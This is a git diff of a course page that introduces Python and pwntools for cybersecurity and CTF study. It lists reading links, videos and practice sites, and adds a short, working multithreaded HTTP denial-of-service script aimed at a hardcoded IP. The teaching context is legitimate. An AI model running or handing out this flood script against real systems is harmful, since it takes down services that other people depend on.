@@ -1,6 +1,6 @@
 # Module-1 Week-2 (Python) 🐍
 
-Welcome to the second week of YoS :) </br>
+Welcome to the second week (actually 1.5 weeks) of YoS :) </br>
 This week we will be covering Python along with some of its very powerful library like pwntools.
 <p align="center">
 <img src="https://user-images.githubusercontent.com/81357954/153569492-a10ef6ad-3e2a-45ed-bb46-8758eae71cbf.png" alt="drawing" width="400"/>
@@ -8,13 +8,38 @@ This week we will be covering Python along with some of its very powerful librar
 
 **Why it is called Python [:)?](https://docs.python.org/3/faq/general.html#:~:text=Details%20here.-,Why%20is%20it%20called%20Python%3F,to%20call%20the%20language%20Python.)** </br>
 
-[**Python**](https://en.wikipedia.org/wiki/Python_(programming_language)) is an [interpreted](https://www.ibm.com/docs/en/zos-basic-skills?topic=zos-compiled-versus-interpreted-languages) general-purpose programming language.
+[**Python**](https://en.wikipedia.org/wiki/Python_(programming_language)) is an [interpreted](https://www.ibm.com/docs/en/zos-basic-skills?topic=zos-compiled-versus-interpreted-languages) general-purpose programming language. It is one of the most popular and widely-used programming languages in the world due to its high usability and large collection of libraries. 
 Again Python is an open source software like Linux. So you can look up its source code [here](https://github.com/python/cpython), though you are not encouraged to read them 🦖.
 
-An interesting [read](https://softwareengineering.stackexchange.com/questions/20988/why-is-python-written-in-c-and-not-in-c) on whether Python is written in C or not.</br> We prefer Python since it is very easy to learn and write complex programs in it.
+Is Python itself written in C or C++? [An interesting read](https://softwareengineering.stackexchange.com/questions/20988/why-is-python-written-in-c-and-not-in-c) on this.
+Unlike C or C++, Python has [automatic memory management](https://www.geeksforgeeks.org/memory-management-in-python/) i.e. in Python memory allocation and deallocation method is automatic, since it has its own garbage collector, so that the user does not have to do manual garbage collection. Python is a [dynamically typed](https://www.geeksforgeeks.org/type-systemsdynamic-typing-static-typing-duck-typing/) programming language which makes it more succint. 
+
+We prefer Python in Cybersecurity, because complex scripts or attacks can be easily written in it. It helps to automate tasks across the cyberattack life cycle for both cyber attackers and defenders. Also, debugging python codes is quite simple.
+
+```
+import socket
+import threading
+target = '10.0.0.138'
+fake_ip = '182.21.20.32'
+port = 80
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+```
+<p align="center">
+  Snippet of a simple <a href ="https://en.wikipedia.org/wiki/Denial-of-service_attack">DoS attack</a> script in python. 
+</p>
+
 
 ## Installation
-We are not taking up `how to install python`. Since it is available by default on Linux. Also, just a google search away.</br>
+We are not taking up `how to install python`. Since it is available by default on Linux. Also, just a google search away :).</br>
 [Here](http://docs.pwntools.com/en/latest/install.html) is the link to install `pwntools`. Though it comes pre installed on the VM we have provided.
 
 ## Overview
@@ -35,7 +60,7 @@ Credits to [scimaths](https://github.com/scimaths) 🙏
 3. [Pwntools Cheat Sheet](https://gist.github.com/anvbis/64907e4f90974c4bdd930baeb705dedf)
 
 ## Video guides
-- Another brief learn python [playlist](https://youtube.com/playlist?list=PLUnFa7c4_tjFDIoyqbT51heYEvAudcNUt) (If you prefer video over reading)
+- Another brief learn python [playlist](https://www.youtube.com/playlist?list=PLQVvvaa0QuDeAams7fkdcwOGBpGdHpXln) (The first 8 videos (85 mins) of the playlist are enough to get you going, you may skip the remaining videos :)
 
 
 ## CTF challenge Walkthroughs
@@ -45,7 +70,7 @@ Credits to [scimaths](https://github.com/scimaths) 🙏
 3. Request module usage [OverTheWire natas level4](https://www.youtube.com/watch?v=Sf63W1xXzNU) (11  mins)
 4. Pyjail  [Offshift 2021](https://www.youtube.com/watch?v=aK3b0PM1Fz8) (6 mins)
 
-Now you may move to **Challenges** section to complete this week's material
+Now you may move to **Challenges** section to complete this week's material. Optimal duration to complete all the above material is 1.5 weeks(11 days).
 
 ## Practice
 - [PicoGym](https://play.picoctf.org/practice) (Filter challenges by **Genral Skills**)
